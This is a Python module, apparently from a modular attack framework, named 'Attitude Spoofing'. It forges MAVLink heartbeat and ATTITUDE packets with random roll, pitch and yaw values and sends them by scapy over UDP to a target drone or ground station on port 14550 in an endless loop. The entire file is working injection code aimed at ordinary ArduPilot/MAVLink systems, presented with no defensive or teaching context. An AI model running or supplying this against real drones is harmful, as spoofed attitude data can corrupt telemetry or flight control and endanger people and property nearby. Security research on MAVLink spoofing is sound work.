from core.base import BaseModule
from pymavlink import mavutil
from scapy.all import *
import time
import random

class AttitudeSpoofingModule(BaseModule):
    def __init__(self):
        super().__init__(name="Attitude Spoofing", description="Attacks drone's attitude control", category="Injection")
        self.set_option("target", ("", True, "The target IP address"))
        self.set_option("port", ("14550", True, "The target port"))

    def create_heartbeat(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        heartbeat = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )

        return heartbeat.pack(mav)

    def create_attitude(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        roll = random.uniform(-1.0, 1.0)
        pitch = random.uniform(-1.0, 1.0)
        yaw = random.uniform(-3.14, 3.14)
        rollspeed = random.uniform(-0.1, 0.1)
        pitchspeed = random.uniform(-0.1, 0.1)
        yawspeed = random.uniform(-0.1, 0.1)

        attitude = mav.attitude_encode(
            time_boot_ms=int(time.time() * 1e3) % 4294967295,
            roll=roll,
            pitch=pitch,
            yaw=yaw,
            rollspeed=rollspeed,
            pitchspeed=pitchspeed,
            yawspeed=yawspeed
        )

        return attitude.pack(mav)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        send(packet)

    def run(self):
        target_ip = self.options["target"][0]
        target_port = int(self.options["port"][0])

        if not target_ip or target_port <= 0:
            print("Invalid target IP or port.")
            return

        while True:
            heartbeat_packet = self.create_heartbeat()
            attitude_packet = self.create_attitude()

            self.send_mavlink_packet(heartbeat_packet, target_ip, target_port)
            self.send_mavlink_packet(attitude_packet, target_ip, target_port)
            
            print(f"Sent heartbeat and ATTITUDE packets to {target_ip}:{target_port}")
            time.sleep(1)  # Add delay to avoid overwhelming the network
